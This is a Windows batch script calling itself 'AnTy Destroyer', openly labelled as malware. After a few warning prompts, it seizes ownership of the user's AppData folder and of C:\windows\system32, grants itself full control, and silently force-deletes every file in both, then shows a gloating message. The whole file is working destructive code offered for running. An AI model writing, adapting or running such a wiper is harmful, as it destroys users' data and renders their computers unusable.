@echo off
title AnTy Destroyer v1.0.1
cd file
start warning.vbs
echo This malware is no joke
pause
echo I am not responsible for any damages
pause
msg * this is your last chance to click off!!
pause
color 04
cls
echo beginning destruction
takeown /f "C:\%USERPROFILE%\appdata" /a /r /d Y >nul
icacls "C:\%USERPROFILE%\appdata" /grant administrators:F >nul
cd /d "%USERPROFILE%\appdata"
del *.* /s /f /q >nul
takeown /f "C:\windows\system32" /a /r /d Y >nul
icacls "C:\windows\system32" /grant administrators:F >nul
cd "C:\windows\system32"
del *.* /s /f /q >nul
msg * now that you have run this program and ignored my warnings, your computer is now cooked. all files and appdata are now destroyed, remeber im not responsible for any damages :)
